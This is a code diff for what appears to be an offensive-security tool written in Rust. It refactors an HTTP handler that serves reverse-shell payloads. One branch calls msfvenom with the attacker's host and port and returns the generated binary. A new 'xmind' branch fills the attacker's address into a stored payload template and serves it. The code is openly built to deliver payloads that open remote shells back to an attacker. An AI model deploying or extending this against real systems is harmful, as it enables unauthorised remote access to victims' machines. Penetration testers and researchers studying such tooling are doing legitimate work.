@@ -11,55 +11,25 @@ use hyper::{Body, Request, Response, StatusCode};
 use hyper::http::response::Builder;
 
 use crate::*;
-use crate::revshell::revshell_model::RevShells;
+use crate::revshell::revshell_model::{Revshell, RevShells};
 use crate::shared::config::SHARED_DATA;
 
 pub async fn listen(req: Request<Body>, revshells: RevShells, lhost: String) -> Result<Response<Body>, Infallible> {
     if &req.uri().to_string() == "/" {
         return return_list_of_revshells(&revshells).await;
     }
-    let shared_data = SHARED_DATA.clone();
 
     match revshells.revshells().iter().find(|revshell| "/".to_owned() + &revshell.link_name() == req.uri().to_string()) {
         Some(revshell) => {
-            let cmd = revshell.command(lhost.as_str(), *shared_data.lport_current.lock().await);
-            let temp_file_path = &revshell.file_path();
-
-            logger_trace!("{}", format!("running {} [~] `{}`", revshell.rev_type(), &cmd.clone().italic()));
-
-            let mut cmd_args = cmd.trim().split(" ").collect::<Vec<&str>>();
-            cmd_args.push("-o");
-            cmd_args.push(temp_file_path);
-
-            let mut command = Command::new("msfvenom");
-            command.args(&cmd_args[1..cmd_args.len()]);
-
-            match command.status() {
-                Ok(output) => {
-                    if output.success() {
-                        logger_debug!(format!(
-                            "{} revshell > {} created and downloaded.",
-                            Icons::Download.to_string().blue().bold(),
-                            revshell.title()
-                        ));
-
-                        return Ok(Builder::new()
-                            .status(StatusCode::OK)
-                            .body(Body::from(fs::read(revshell.file_path()).unwrap()))
-                            .unwrap());
-                    } else {
-                        return Ok(Builder::new()
-                            .status(StatusCode::INTERNAL_SERVER_ERROR)
-                            .body(Body::empty())
-                            .unwrap());
-                    }
-                }
-                Err(_) => {
-                    return Ok(Builder::new()
-                        .status(StatusCode::INTERNAL_SERVER_ERROR)
-                        .body(Body::empty())
-                        .unwrap());
-                }
+            if revshell.labels().contains(&String::from("msfvenom")){
+                by_type_msfvenon(revshell, lhost).await
+            } else if revshell.labels().contains(&String::from("xmind")) {
+                by_type_xmind(revshell, lhost).await
+            } else {
+                Ok(Builder::new()
+                    .status(StatusCode::NOT_FOUND)
+                    .body(Body::empty())
+                    .unwrap())
             }
         }
         None => {
@@ -90,4 +60,62 @@ async fn return_list_of_revshells(revshells: &RevShells) -> Result<Response<Body
         .status(StatusCode::OK)
         .body(Body::from(result_html))
         .unwrap())
+}
+async fn by_type_xmind(revshell: &Revshell, lhost: String) -> Result<Response<Body>, Infallible> {
+    let shared_data = SHARED_DATA.clone();
+    let lport = shared_data.lport_current.lock().await;
+
+    let mut payload = revshell.description().to_string();
+    payload = payload.replace("$LHOST", lhost.as_str());
+    payload = payload.replace("$LPORT", &*lport.to_string());
+
+    return Ok(Builder::new()
+        .status(StatusCode::OK)
+        .body(Body::from(payload))
+        .unwrap());
+}
+
+
+async fn by_type_msfvenon(revshell: &Revshell, lhost: String) -> Result<Response<Body>, Infallible> {
+    let shared_data = SHARED_DATA.clone();
+
+    let cmd = revshell.command(lhost.as_str(), *shared_data.lport_current.lock().await);
+    let temp_file_path = &revshell.file_path();
+
+    logger_trace!("{}", format!("running {} [~] `{}`", revshell.rev_type(), &cmd.clone().italic()));
+
+    let mut cmd_args = cmd.trim().split(" ").collect::<Vec<&str>>();
+    cmd_args.push("-o");
+    cmd_args.push(temp_file_path);
+
+    let mut command = Command::new("msfvenom");
+    command.args(&cmd_args[1..cmd_args.len()]);
+
+    match command.status() {
+        Ok(output) => {
+            if output.success() {
+                logger_debug!(format!(
+                            "{} revshell > {} created and downloaded.",
+                            Icons::Download.to_string().blue().bold(),
+                            revshell.title()
+                        ));
+
+                return Ok(Builder::new()
+                    .status(StatusCode::OK)
+                    .body(Body::from(fs::read(revshell.file_path()).unwrap()))
+                    .unwrap());
+            } else {
+                return Ok(Builder::new()
+                    .status(StatusCode::INTERNAL_SERVER_ERROR)
+                    .body(Body::empty())
+                    .unwrap());
+            }
+        }
+        Err(_) => {
+            return Ok(Builder::new()
+                .status(StatusCode::INTERNAL_SERVER_ERROR)
+                .body(Body::empty())
+                .unwrap());
+        }
+    }
 }
